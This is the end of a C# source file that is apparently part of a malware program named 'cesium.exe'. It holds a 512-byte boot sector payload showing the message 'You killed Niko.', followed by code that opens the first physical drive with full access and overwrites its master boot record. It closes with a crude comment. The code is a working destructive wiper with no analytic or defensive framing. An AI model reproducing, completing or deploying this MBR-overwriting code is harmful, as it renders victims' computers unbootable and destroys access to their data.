0x10, 0xEB, 0xF5, 0xC3, 0x59, 0x6F, 0x75, 0x20, 0x6B, 0x69, 0x6C, 0x6C, 0x65, 0x64, 0x20, 0x4E,
0x69, 0x6B, 0x6F, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

            IntPtr mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            if (WriteFile(mbr, mbrData, 512u, out uint lpNumberOfBytesWritten, IntPtr.Zero)) { }
            else
            {
                MessageBox.Show(
                    "MBR overwrite failed!",

                    "cesium.exe", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }   
    }
}

// I eat shit